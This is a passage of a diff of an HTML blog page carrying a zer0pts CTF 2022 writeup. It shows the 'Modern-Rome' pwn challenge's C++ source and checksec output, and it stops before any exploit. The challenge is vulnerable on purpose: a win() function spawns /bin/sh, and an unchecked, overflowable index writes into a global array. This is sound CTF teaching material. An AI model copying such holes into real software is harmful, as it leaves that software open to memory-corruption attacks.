@@ -1,217 +1,215 @@
 <!DOCTYPE html>
-<html lang="en-us">
-  <head>
-    <title>zer0pts CTF 2022 | Welcome to Chovid99&#39;s Blog</title>
-
-    <meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-<meta name="viewport" content="width=device-width,minimum-scale=1">
-<meta property="og:title" content="zer0pts CTF 2022" />
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>zer0pts CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="zer0pts CTF 2022" />
 <meta property="og:description" content="Writeup for zer0pts CTF 2022 by Chovid99" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://chovid99.github.io/posts/zer0pts-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://chovid99.github.io/posts/zer0pts-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-03-11T20:31:19+07:00" />
-<meta property="article:modified_time" content="2022-03-11T20:31:19+07:00" />
+<meta property="article:modified_time" content="2023-02-23T18:03:33+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
 
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>
+<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>
 
 <meta name="twitter:title" content="zer0pts CTF 2022"/>
 <meta name="twitter:description" content="Writeup for zer0pts CTF 2022 by Chovid99"/>
-<meta name="twitter:site" content="@Chovid99"/>
-<meta name="twitter:creator" content="@Chovid99"/>
-<meta property="og:site_name" content="Chovid99's Blog">
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/zer0pts-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/pragyan-ctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/nahamcon-ctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "zer0pts CTF 2022",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/zer0pts-ctf-2022\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, zer0pts, pwn, short-overflow, got-overwrite, RSA, Fermat, crypto, 2022","wordcount":  899 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/zer0pts-ctf-2022\/","datePublished": "2022-03-11T20:31:19+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Chovid99"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
-<meta name="generator" content="Hugo 0.105.0">
-
-
-  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
-
-
-<link rel="stylesheet" href="/css/style.css">
-<link rel="stylesheet" href="/css/tocbot.css">
-
-
-
-<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-
-
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-
-    gtag('config', 'G-19HP521HQ9');
-  </script>
-
-
-
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
-    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>
-
-
-
-
-
-
-  </head>
-
-  <body>
-    <nav class="navigation">
-	
-		<a href="/"> <span class="arrow">←</span>Home</a>
-	
-	<a href="/posts">Posts</a>
-	<a href="/tags">Tags</a>
-	<a href="/about">About</a>
-
-	
-
-	
-</nav>
-
-
-    <main class="main">
-      
-
-<section id="single">
-    <h1 class="title">zer0pts CTF 2022</h1>
-
-    <div class="tip">
-        <time datetime="2022-03-11 20:31:19 &#43;0700 &#43;07">Mar 11, 2022</time>
-        <span class="split">
-          ·
-        </span>
-        <span>
-          903 words
-        </span>
-        <span class="split">
-          ·
-        </span>
-        <span>
-          5 minute read
-        </span>
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
     </div>
-
-    <div class="content">
-      <div class="post-content js-toc-content">
-        <p>For this CTF, I managed to solve two challenges only. I hope I can do better in the next CTF.</p>
-<h1 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h1>
-<h2 id="modern-rome">Modern-Rome <a href="#modern-rome" class="anchor">#</a></h2>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">zer0pts CTF 2022</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/Chovid99" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chovid99</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 11, 2022">Mar 11, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;899 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#modern-rome">Modern-Rome</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#anti-fermat">Anti-Fermat</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>For this CTF, I managed to solve two challenges only. I hope I can do better in the next CTF.</p>
+<h1 id="pwn">Pwn</h1>
+<h2 id="modern-rome">Modern-Rome</h2>
 <p>We were given a binary compiled from cpp file. Below is the cpp file.</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;string&gt;</span><span style="color:#099">
-</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;iostream&gt;</span><span style="color:#099">
-</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
-</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">short</span> buf[<span style="color:#f60">10</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">win</span>() {
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>system(<span style="color:#c30">&#34;/bin/sh&#34;</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">short</span> <span style="color:#c0f">readroman</span>(){
-</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">short</span> res <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>string s;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>cin <span style="color:#555">&gt;&gt;</span> s;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">auto</span> it <span style="color:#555">=</span> s.crbegin();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> b <span style="color:#555">=</span> <span style="color:#f60">1</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">auto</span> <span style="color:#99f">c</span>: <span style="color:#c30">&#34;IXCM&#34;</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">int</span> cnt <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span> (cnt <span style="color:#555">&lt;</span> <span style="color:#f60">9</span> <span style="color:#555">&amp;&amp;</span> it <span style="color:#555">!=</span> s.crend() <span style="color:#555">&amp;&amp;</span> <span style="color:#555">*</span>it <span style="color:#555">==</span> c) {
-</span></span><span style="display:flex;"><span>      it<span style="color:#555">++</span>;
-</span></span><span style="display:flex;"><span>      cnt<span style="color:#555">++</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    res <span style="color:#555">+=</span> b <span style="color:#555">*</span> cnt;
-</span></span><span style="display:flex;"><span>    b <span style="color:#555">*=</span> <span style="color:#f60">10</span>;
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> res;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>() {
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>setbuf(stdin, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>setbuf(stdout, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>cout <span style="color:#555">&lt;&lt;</span> <span style="color:#c30">&#34;ind: &#34;</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> ind <span style="color:#555">=</span> readroman();
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>cout <span style="color:#555">&lt;&lt;</span> <span style="color:#c30">&#34;val: &#34;</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> val <span style="color:#555">=</span> readroman();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>cout <span style="color:#555">&lt;&lt;</span> <span style="color:#c30">&#34;buf[&#34;</span> <span style="color:#555">&lt;&lt;</span> ind <span style="color:#555">&lt;&lt;</span> <span style="color:#c30">&#34;] = &#34;</span> <span style="color:#555">&lt;&lt;</span> val <span style="color:#555">&lt;&lt;</span> std<span style="color:#555">::</span>endl;
-</span></span><span style="display:flex;"><span>  buf[ind] <span style="color:#555">=</span> val;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>exit(<span style="color:#f60">0</span>);
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">short</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">short</span> <span class="nf">readroman</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">short</span> <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">auto</span> <span class="n">it</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">crbegin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="nl">c</span><span class="p">:</span> <span class="s">&#34;IXCM&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">cnt</span> <span class="o">&lt;</span> <span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="n">it</span> <span class="o">!=</span> <span class="n">s</span><span class="p">.</span><span class="n">crend</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">it</span> <span class="o">==</span> <span class="n">c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">it</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">+=</span> <span class="n">b</span> <span class="o">*</span> <span class="n">cnt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">*=</span> <span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;ind: &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">ind</span> <span class="o">=</span> <span class="n">readroman</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;val: &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="n">readroman</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;buf[&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">ind</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;] = &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="n">ind</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Checksec result</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    Arch:     amd64-64-little
-</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
-</span></span><span style="display:flex;"><span>    Stack:    Canary found
-</span></span><span style="display:flex;"><span>    NX:       NX enabled
-</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#555">(</span>0x400000<span style="color:#555">)</span>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the given file, some notes that we can take:</p>
@@ -227,136 +225,136 @@
 </li>
 </ul>
